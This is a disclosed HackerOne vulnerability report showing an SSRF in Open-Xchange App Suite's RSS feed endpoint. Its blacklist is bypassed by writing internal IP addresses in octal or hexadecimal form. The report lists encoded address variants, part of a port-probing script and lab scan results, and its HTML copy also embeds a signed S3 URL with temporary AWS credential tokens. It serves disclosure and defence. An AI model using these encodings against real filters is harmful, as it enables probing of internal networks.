{"id":299130,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTkxMzA=","url":"https://hackerone.com/reports/299130","title":"SSRF - RSS feed, blacklist bypass (IP Formatting)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-12-18T20:10:54.023Z","submitted_at":"2017-12-18T20:10:54.023Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"logan5","url":"/logan5","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/110/421/4eacc0e36a20a036380e88612bb8755d1dddda08_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-07-04T13:02:31.008Z","bug_reporter_agreed_on_going_public_at":"2019-07-04T13:02:30.898Z","team_member_agreed_on_going_public_at":"2019-07-04T11:11:41.372Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"FYI - Tested on local installation of App Suite 7.8.4 REV 17\n\nHello,\n\nThere appears to be a SSRF vulnerability in the below endpoint.  This is due to a failure in the App Suite code when evaluating an IP address against a blacklist.  The SSRF is limited to scanning hosts on port 80/443 but accuracy in responses is improved over my earlier reports ( #296045 #293847 ) as error codes are returned instead of a blind response.\n\nThe endpoint is the following which allows you at add RSS feeds to the portal homepage of a user:\n\n**http://\u003cdomain\u003e/appsuite/api/rss?session=\u003csession\u003e**\n\nPre-requisites to exploit this vulnerability are the following:\n\n-Valid session from login or anonymous link\n\n###Summary\n\nViewing the commit history of the backend source code, I came upon the following commit which put in place a blacklist to prevent the probing of localhost ports and internal IP addresses:\n\n```\ncommit 8891d6999d967264376bafd86451dad8e419e4db\nAuthor: Martin Schneider \u003cmartin.schneider@open-xchange.com\u003e\nDate:   Wed Apr 20 10:09:51 2016 +0200\n\n    Fix for bug 45402: possibility to blacklist hosts and whitelist ports for RSS feeds to prevent SSRFs\n\n    (cherry picked from commit 072dc501f1f09d2cd567c3b3eaeb68eaa203e40b)\n```\n\nThis was dependent on what is entered in the following configuration property: **com.openexchange.messaging.rss.feed.blacklist** which is in the following file:  **/opt/open-xchange/etc/rssmessaging.properties**\n\n```\n# Specifies a black-list for those hosts that are covered by denoted IP range; e.g. \"127.0.0.1-127.255.255.255, localhost, internal.domain.org\"\n# An empty value means no black-listing is active\n# Default is \"127.0.0.1-127.255.255.255,localhost\"\ncom.openexchange.messaging.rss.feed.blacklist=127.0.0.1-127.255.255.255,localhost,192.168.0.10\n\n```\nThe issue is with the evaluation of the IP addresses in the blacklist variable.  Blacklisted IP addresses are successfully blocked when in decimal format but are allowed when the IP address is in Hexadecimal or Octal.\n\n\n###PoC Setup\n\n{F247928}\n\n\nThe below PoC will contain the following files:\n\n**request.py** (Attackers python script that will submit different formats of IP address 192.168.0.10 to the RSS endpoint)\n\n**script_results.txt** (Results of different IP address formats and port response)\n\nOctal and Hex conversion of 192.168.0.10 (target host) to obtain a test suite of IP address formats was done using the following website:\n\n**https://www.psyon.org/tools/ip_address_converter.php**\n\nBelow are the IP address formats that will be tested:\n```\n #Decimal/Hex/Octal formats of 192.168.0.10\n    ##########################################\n \n    #Decimal\n \n    #8-bit  192.168.0.10\n    #16-bit 192.168.10\n    #24-bit 192.11010058\n    #32-bit 3232235530\n \n    #Octal\n \n    #8-bit  0300.0250.00.012\n    #16-bit 0300.0250.012\n    #24-bit 0300.052000012\n    #32-bit 030052000012\n \n    #Hexadecimal\n \n    #8-bit  0xc0.0xa8.0x0.0xa\n    #16-bit 0xc0.0xa8.0xa\n    #24-bit 0xc0.0xa8000a\n    #32-bit 0xc0a8000a\n```\n\n###PoC\n\n-The **requests.py** script will run on **192.168.0.6 (Attacker server)** this will connect to the App Suite server (192.168.0.16) and submit multiple PUT requests to the RSS endpoint\n\n-The submitted IP address in each PUT request will be to the blacklisted IP address **(192.168.0.10)**.  The request will be blocked if in decimal format or allowed if in Hex/Octal\n\n-There will be Netcat listener running on TCP port **80** on **192.168.0.10** which will listen for requests.\n\n-The HTTP response from each request will be analysed for keywords to determine the port status on the target host.  The following code in **requests.py** takes care of this:\n\n```\n # Check HTTP response text\n \n    if \"Cannot connect to RSS with URL\" in url_response:\n        return_message = \"BLACKLIST MATCH, ABORTED\"\n \n    elif \"Invalid RSS URL or not well-formed XML content provided by URL\" in url_response:\n        return_message = \"HTTP RESPONSE RECEIVED (INVALID RSS), PORT OPEN\"\n \n    elif \"Timeout while reading the RSS feed from URL\" in url_response:\n        return_message = \"PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\"\n \n    elif \"Connection refused (Connection refused)\" in url_response:\n        return_message = \"CONNECTION REFUSED, PORT CLOSED\"\n \n    elif \"Unexpected end of file from server\" in url_response:\n        return_message = \"HTTP RESPONSE RECEIVED (EOF ERROR), PORT OPEN\"\n \n    elif \"\\\"data\\\":[]\" in url_response:\n        return_message = \"HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\"\n \n    elif \"javax.net.ssl.HttpsURLConnection\" in url_response:\n        return_message = \"HTTPS RESPONSE RECEIVED (SSL ERROR), PORT OPEN\"\n ```\n\n-The results will be sent to **script_output.txt**\n\n \n###Results\n\n-Below are the results from the **script_output.txt** file.  As you can see, using the Octal/Hex formats of the IP address will produce the following result when a netcat listener is running on TCP port 80:\n```\nIP Format: 192.11010058  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 192.168.0.10  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 192.168.10  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 3232235530  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 0300.0250.00.012  Response:  ['PORT TIMEOUT, NETCAT LISTENER, PORT OPEN']\nIP Format: 0300.0250.012  Response:  ['PORT TIMEOUT, NETCAT LISTENER, PORT OPEN']\nIP Format: 0300.052000012  Response:  ['PORT TIMEOUT, NETCAT LISTENER, PORT OPEN']\nIP Format: 030052000012  Response:  ['PORT TIMEOUT, NETCAT LISTENER, PORT OPEN']\nIP Format: 0xc0.0xa8.0x0.0xa  Response:  ['PORT TIMEOUT, NETCAT LISTENER, PORT OPEN']\nIP Format: 0xc0.0xa8.0xa  Response:  ['PORT TIMEOUT, NETCAT LISTENER, PORT OPEN']\nIP Format: 0xc0.0xa8000a  Response:  ['PORT TIMEOUT, NETCAT LISTENER, PORT OPEN']\nIP Format: 0xc0a8000a  Response:  ['PORT TIMEOUT, NETCAT LISTENER, PORT OPEN']\n```\n\n```\nGET /test.xml HTTP/1.1\nAccept-Encoding: gzip\nUser-Agent: Rome Client (http://tinyurl.com/64t5n) Ver: UNKNOWN\nCache-Control: no-cache\nPragma: no-cache\nHost: 0300.0250.00.012\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nConnection: keep-alive\n```\n\n-Below are the results when Apache is running on port 80 of the target host:\n\n```\nIP Format: 192.11010058  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 192.168.0.10  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 192.168.10  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 3232235530  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 0300.0250.00.012  Response:  ['HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN']\nIP Format: 0300.0250.012  Response:  ['HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN']\nIP Format: 0300.052000012  Response:  ['HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN']\nIP Format: 030052000012  Response:  ['HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN']\nIP Format: 0xc0.0xa8.0x0.0xa  Response:  ['HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN']\nIP Format: 0xc0.0xa8.0xa  Response:  ['HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN']\nIP Format: 0xc0.0xa8000a  Response:  ['HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN']\nIP Format: 0xc0a8000a  Response:  ['HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN']\n```\n\nApache access log:\n```\n127.0.1.1:80 192.168.0.16 - - [18/Dec/2017:18:58:56 +0000] \"GET /test.xml HTTP/1.1\" 400 0 \"-\" \"Rome Client (http://tinyurl.com/64t5n) Ver: UNKNOWN\"\n```\n\n-Below are the results when there is nothing listening on TCP port 80 on the target host.\n\n```\nIP Format: 192.11010058  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 192.168.0.10  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 192.168.10  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 3232235530  Response:  ['BLACKLIST MATCH, ABORTED']\nIP Format: 0300.0250.00.012  Response:  ['CONNECTION REFUSED, PORT CLOSED']\nIP Format: 0300.0250.012  Response:  ['CONNECTION REFUSED, PORT CLOSED']\nIP Format: 0300.052000012  Response:  ['CONNECTION REFUSED, PORT CLOSED']\nIP Format: 030052000012  Response:  ['CONNECTION REFUSED, PORT CLOSED']\nIP Format: 0xc0.0xa8.0x0.0xa  Response:  ['CONNECTION REFUSED, PORT CLOSED']\nIP Format: 0xc0.0xa8.0xa  Response:  ['CONNECTION REFUSED, PORT CLOSED']\nIP Format: 0xc0.0xa8000a  Response:  ['CONNECTION REFUSED, PORT CLOSED']\nIP Format: 0xc0a8000a  Response:  ['CONNECTION REFUSED, PORT CLOSED']\n```\n\n## Impact\n\nThis is a limited SSRF in that you can only scan port 80/443 due to the port whitelist in place.  However, the results are more accurate than a blind response which is reliant on the HTTP response times to determine open ports.  Again, no data was able to be extracted, so this vulnerability is limited to reconnaissance only.","vulnerability_information_html":"\u003cp\u003eFYI - Tested on local installation of App Suite 7.8.4 REV 17\u003c/p\u003e\n\n\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThere appears to be a SSRF vulnerability in the below endpoint.  This is due to a failure in the App Suite code when evaluating an IP address against a blacklist.  The SSRF is limited to scanning hosts on port 80/443 but accuracy in responses is improved over my earlier reports ( \u003ca href=\"/reports/296045\"\u003e#296045\u003c/a\u003e \u003ca href=\"/reports/293847\"\u003e#293847\u003c/a\u003e ) as error codes are returned instead of a blind response.\u003c/p\u003e\n\n\u003cp\u003eThe endpoint is the following which allows you at add RSS feeds to the portal homepage of a user:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ehttp://\u0026lt;domain\u0026gt;/appsuite/api/rss?session=\u0026lt;session\u0026gt;\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003ePre-requisites to exploit this vulnerability are the following:\u003c/p\u003e\n\n\u003cp\u003e-Valid session from login or anonymous link\u003c/p\u003e\n\n\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eViewing the commit history of the backend source code, I came upon the following commit which put in place a blacklist to prevent the probing of localhost ports and internal IP addresses:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecommit 8891d6999d967264376bafd86451dad8e419e4db\nAuthor: Martin Schneider \u0026lt;martin.schneider@open-xchange.com\u0026gt;\nDate:   Wed Apr 20 10:09:51 2016 +0200\n\n    Fix for bug 45402: possibility to blacklist hosts and whitelist ports for RSS feeds to prevent SSRFs\n\n    (cherry picked from commit 072dc501f1f09d2cd567c3b3eaeb68eaa203e40b)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis was dependent on what is entered in the following configuration property: \u003cstrong\u003ecom.openexchange.messaging.rss.feed.blacklist\u003c/strong\u003e which is in the following file:  \u003cstrong\u003e/opt/open-xchange/etc/rssmessaging.properties\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# Specifies a black-list for those hosts that are covered by denoted IP range; e.g. \u0026quot;127.0.0.1-127.255.255.255, localhost, internal.domain.org\u0026quot;\n# An empty value means no black-listing is active\n# Default is \u0026quot;127.0.0.1-127.255.255.255,localhost\u0026quot;\ncom.openexchange.messaging.rss.feed.blacklist=127.0.0.1-127.255.255.255,localhost,192.168.0.10\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe issue is with the evaluation of the IP addresses in the blacklist variable.  Blacklisted IP addresses are successfully blocked when in decimal format but are allowed when the IP address is in Hexadecimal or Octal.\u003c/p\u003e\n\n\u003ch3 id=\"poc-setup\"\u003ePoC Setup\u003c/h3\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"poc.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/247/928/8c2c155e2b107bd40f55f90e6497ed649058fb9d/poc.png?response-content-disposition=attachment%3B%20filename%3D%22poc.png%22%3B%20filename%2A%3DUTF-8%27%27poc.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052806Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026amp;X-Amz-Signature=de435c660f5acb6e0ee2ecf38126a6741922f9ba40d1eb24eeb1dc6ac0727b13\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/247/928/8c2c155e2b107bd40f55f90e6497ed649058fb9d/poc.png?response-content-disposition=attachment%3B%20filename%3D%22poc.png%22%3B%20filename%2A%3DUTF-8%27%27poc.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052806Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026amp;X-Amz-Signature=de435c660f5acb6e0ee2ecf38126a6741922f9ba40d1eb24eeb1dc6ac0727b13\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe below PoC will contain the following files:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003erequest.py\u003c/strong\u003e (Attackers python script that will submit different formats of IP address 192.168.0.10 to the RSS endpoint)\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003escript_results.txt\u003c/strong\u003e (Results of different IP address formats and port response)\u003c/p\u003e\n\n\u003cp\u003eOctal and Hex conversion of 192.168.0.10 (target host) to obtain a test suite of IP address formats was done using the following website:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e\u003ca title=\"https://www.psyon.org/tools/ip_address_converter.php\" href=\"/redirect?url=https%3A%2F%2Fwww.psyon.org%2Ftools%2Fip_address_converter.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.psyon.org/tools/ip_address_converter.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eBelow are the IP address formats that will be tested:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e #Decimal/Hex/Octal formats of 192.168.0.10\n    ##########################################\n\n    #Decimal\n\n    #8-bit  192.168.0.10\n    #16-bit 192.168.10\n    #24-bit 192.11010058\n    #32-bit 3232235530\n\n    #Octal\n\n    #8-bit  0300.0250.00.012\n    #16-bit 0300.0250.012\n    #24-bit 0300.052000012\n    #32-bit 030052000012\n\n    #Hexadecimal\n\n    #8-bit  0xc0.0xa8.0x0.0xa\n    #16-bit 0xc0.0xa8.0xa\n    #24-bit 0xc0.0xa8000a\n    #32-bit 0xc0a8000a\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"poc\"\u003ePoC\u003c/h3\u003e\n\n\u003cp\u003e-The \u003cstrong\u003erequests.py\u003c/strong\u003e script will run on \u003cstrong\u003e192.168.0.6 (Attacker server)\u003c/strong\u003e this will connect to the App Suite server (192.168.0.16) and submit multiple PUT requests to the RSS endpoint\u003c/p\u003e\n\n\u003cp\u003e-The submitted IP address in each PUT request will be to the blacklisted IP address \u003cstrong\u003e(192.168.0.10)\u003c/strong\u003e.  The request will be blocked if in decimal format or allowed if in Hex/Octal\u003c/p\u003e\n\n\u003cp\u003e-There will be Netcat listener running on TCP port \u003cstrong\u003e80\u003c/strong\u003e on \u003cstrong\u003e192.168.0.10\u003c/strong\u003e which will listen for requests.\u003c/p\u003e\n\n\u003cp\u003e-The HTTP response from each request will be analysed for keywords to determine the port status on the target host.  The following code in \u003cstrong\u003erequests.py\u003c/strong\u003e takes care of this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e # Check HTTP response text\n\n    if \u0026quot;Cannot connect to RSS with URL\u0026quot; in url_response:\n        return_message = \u0026quot;BLACKLIST MATCH, ABORTED\u0026quot;\n\n    elif \u0026quot;Invalid RSS URL or not well-formed XML content provided by URL\u0026quot; in url_response:\n        return_message = \u0026quot;HTTP RESPONSE RECEIVED (INVALID RSS), PORT OPEN\u0026quot;\n\n    elif \u0026quot;Timeout while reading the RSS feed from URL\u0026quot; in url_response:\n        return_message = \u0026quot;PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\u0026quot;\n\n    elif \u0026quot;Connection refused (Connection refused)\u0026quot; in url_response:\n        return_message = \u0026quot;CONNECTION REFUSED, PORT CLOSED\u0026quot;\n\n    elif \u0026quot;Unexpected end of file from server\u0026quot; in url_response:\n        return_message = \u0026quot;HTTP RESPONSE RECEIVED (EOF ERROR), PORT OPEN\u0026quot;\n\n    elif \u0026quot;\\\u0026quot;data\\\u0026quot;:[]\u0026quot; in url_response:\n        return_message = \u0026quot;HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\u0026quot;\n\n    elif \u0026quot;javax.net.ssl.HttpsURLConnection\u0026quot; in url_response:\n        return_message = \u0026quot;HTTPS RESPONSE RECEIVED (SSL ERROR), PORT OPEN\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e-The results will be sent to \u003cstrong\u003escript_output.txt\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch3 id=\"results\"\u003eResults\u003c/h3\u003e\n\n\u003cp\u003e-Below are the results from the \u003cstrong\u003escript_output.txt\u003c/strong\u003e file.  As you can see, using the Octal/Hex formats of the IP address will produce the following result when a netcat listener is running on TCP port 80:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eIP Format: 192.11010058  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 192.168.0.10  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 192.168.10  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 3232235530  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 0300.0250.00.012  Response:  [\u0026#39;PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\u0026#39;]\nIP Format: 0300.0250.012  Response:  [\u0026#39;PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\u0026#39;]\nIP Format: 0300.052000012  Response:  [\u0026#39;PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\u0026#39;]\nIP Format: 030052000012  Response:  [\u0026#39;PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\u0026#39;]\nIP Format: 0xc0.0xa8.0x0.0xa  Response:  [\u0026#39;PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\u0026#39;]\nIP Format: 0xc0.0xa8.0xa  Response:  [\u0026#39;PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\u0026#39;]\nIP Format: 0xc0.0xa8000a  Response:  [\u0026#39;PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\u0026#39;]\nIP Format: 0xc0a8000a  Response:  [\u0026#39;PORT TIMEOUT, NETCAT LISTENER, PORT OPEN\u0026#39;]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /test.xml HTTP/1.1\nAccept-Encoding: gzip\nUser-Agent: Rome Client (http://tinyurl.com/64t5n) Ver: UNKNOWN\nCache-Control: no-cache\nPragma: no-cache\nHost: 0300.0250.00.012\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nConnection: keep-alive\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e-Below are the results when Apache is running on port 80 of the target host:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eIP Format: 192.11010058  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 192.168.0.10  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 192.168.10  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 3232235530  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 0300.0250.00.012  Response:  [\u0026#39;HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\u0026#39;]\nIP Format: 0300.0250.012  Response:  [\u0026#39;HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\u0026#39;]\nIP Format: 0300.052000012  Response:  [\u0026#39;HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\u0026#39;]\nIP Format: 030052000012  Response:  [\u0026#39;HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\u0026#39;]\nIP Format: 0xc0.0xa8.0x0.0xa  Response:  [\u0026#39;HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\u0026#39;]\nIP Format: 0xc0.0xa8.0xa  Response:  [\u0026#39;HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\u0026#39;]\nIP Format: 0xc0.0xa8000a  Response:  [\u0026#39;HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\u0026#39;]\nIP Format: 0xc0a8000a  Response:  [\u0026#39;HTTP RESPONSE RECEIVED (EMPTY ARRAY), PORT OPEN\u0026#39;]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eApache access log:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e127.0.1.1:80 192.168.0.16 - - [18/Dec/2017:18:58:56 +0000] \u0026quot;GET /test.xml HTTP/1.1\u0026quot; 400 0 \u0026quot;-\u0026quot; \u0026quot;Rome Client (http://tinyurl.com/64t5n) Ver: UNKNOWN\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e-Below are the results when there is nothing listening on TCP port 80 on the target host.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eIP Format: 192.11010058  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 192.168.0.10  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 192.168.10  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 3232235530  Response:  [\u0026#39;BLACKLIST MATCH, ABORTED\u0026#39;]\nIP Format: 0300.0250.00.012  Response:  [\u0026#39;CONNECTION REFUSED, PORT CLOSED\u0026#39;]\nIP Format: 0300.0250.012  Response:  [\u0026#39;CONNECTION REFUSED, PORT CLOSED\u0026#39;]\nIP Format: 0300.052000012  Response:  